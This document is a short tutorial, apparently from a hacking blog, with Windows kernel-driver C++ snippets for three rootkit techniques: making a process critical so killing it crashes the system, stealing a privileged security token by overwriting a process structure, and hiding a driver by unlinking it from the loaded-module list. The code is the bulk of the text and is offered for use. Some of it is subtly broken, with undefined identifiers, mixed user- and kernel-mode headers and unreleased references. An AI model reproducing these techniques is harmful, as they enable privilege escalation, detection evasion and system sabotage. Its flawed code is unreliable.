---

# Kernel Hacks 101: A Quick Guide

Here, we're diving into how to make your processes essential, copy privileges, and hide drivers.

## Required Libraries

Before you start coding, make sure to include the necessary libraries for kernel-level programming in Windows:

### Libraries to Import

- **`Windows.h`**: The main header for accessing Windows API functions.
- **`ntddk.h`**: Essential for writing device drivers and accessing kernel-mode functions.
- **`ntstatus.h`**: Contains definitions for NTSTATUS codes, useful for error handling.
- **`wdm.h`**: Provides access to Windows Driver Model functions and structures.

### Importing Libraries

Here’s how you import these libraries in your driver code:

```cpp
#include <ntddk.h>      // Core DDK functions
#include <ntstatus.h>   // NTSTATUS definitions
#include <wdm.h>        // WDM functions and structures
#include <windows.h>    // Windows API functions
```

## Make a Process Essential

### Objective

You want to make a process essential so that if it gets terminated, the system triggers a BSOD (Blue Screen of Death). This is done by using the `ZwSetInformationProcess` function.

### Function Explanation: `ZwSetInformationProcess`

- **Parameters**:
  - `hProcess`: A handle to the process you want to modify (obtained via `ZwOpenProcess`).
  - `ProcessBreakOnTermination`: An information class that specifies the information to set (this makes the process critical).
  - `BreakOnTermination`: A pointer to the value you want to set (typically `1` to enable the feature).
  - `sizeof(BreakOnTermination)`: Size of the data being sent.

- **Returns**: An NTSTATUS code indicating success or failure.

### Sample Code Snippet

```cpp
NTSTATUS MakeProcessEssential(DWORD PID) {
    NTSTATUS status;
    HANDLE hProcess;
    ULONG BreakOnTermination = 1;

    // Open the process to get a handle
    status = ZwOpenProcess(&hProcess, PROCESS_SET_INFORMATION, &clientId);
    // Check if opening was successful, then set the information
    if (NT_SUCCESS(status)) {
        status = ZwSetInformationProcess(hProcess, ProcessBreakOnTermination, &BreakOnTermination, sizeof(BreakOnTermination));
        ZwClose(hProcess);
    }
    return status; // Return the status of the operation
}
```

### Explanation of Code

1. **Opening the Process**: Use `ZwOpenProcess` to get a handle to the process specified by its PID.
2. **Setting the Flag**: If the handle is successfully obtained, `ZwSetInformationProcess` is called to set the "BreakOnTermination" flag.
3. **Handle Cleanup**: Always close the process handle to avoid leaks.

## Copy Privileges from One Process to Another

### Objective

You want to elevate the privileges of a target process by copying them from a source process.

### Function Explanation: `PsLookupProcessByProcessId`

- **Parameters**:
  - `ProcessId`: The ID of the process you want to look up.
  - `Process**`: A pointer that will receive the process object.

- **Returns**: An NTSTATUS code indicating success or failure.

### Sample Code Snippet

```cpp
NTSTATUS CopyPrivileges(ULONG srcPid, ULONG destPid) {
    PEPROCESS srcProcess, destProcess;

    // Lookup the source process by its PID
    if (NT_SUCCESS(PsLookupProcessByProcessId(ULongToHandle(srcPid), &srcProcess))) {
        // Lookup the destination process
        if (NT_SUCCESS(PsLookupProcessByProcessId(ULongToHandle(destPid), &destProcess))) {
            // Copy the security token from source to destination
            *(UINT64*)((UINT64)destProcess + TOKEN_OFFSET) = *(UINT64*)((UINT64)srcProcess + TOKEN_OFFSET);
        }
    }
    return STATUS_SUCCESS; // Return success after copying
}
```

### Explanation of Code

1. **Process Lookup**: Use `PsLookupProcessByProcessId` to obtain pointers to both the source and destination processes.
2. **Copying the Token**: The security token from the source process is copied to the destination process, effectively elevating its privileges.

## Hide a Driver

### Objective

You want to make a driver invisible in the system's loaded drivers list.

### Function Explanation: Adjusting the Load Order List

- **Function**: Modify the linked list that maintains the loaded drivers.
- **Parameters**: 
  - `DriverObject`: A pointer to the driver object you want to hide.

### Sample Code Snippet

```cpp
VOID HideDriver(PDRIVER_OBJECT DriverObject) {
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    
    // Adjust the linked list to hide the driver
    entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
    entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
}
```

### Explanation of Code

1. **Get Driver Entry**: Access the driver’s data table entry through the `DriverObject`.
2. **Modify Links**: Adjust the pointers in the linked list to effectively remove the driver from the list of loaded drivers, making it hidden.

## Wrapping Up

That’s a wrap! Now you have a better understanding of how to make a process essential, copy privileges, and hide a driver. Just remember:

- **Always test in a safe environment** (like a VM).
- **Be aware of the legal implications** of kernel-level programming.
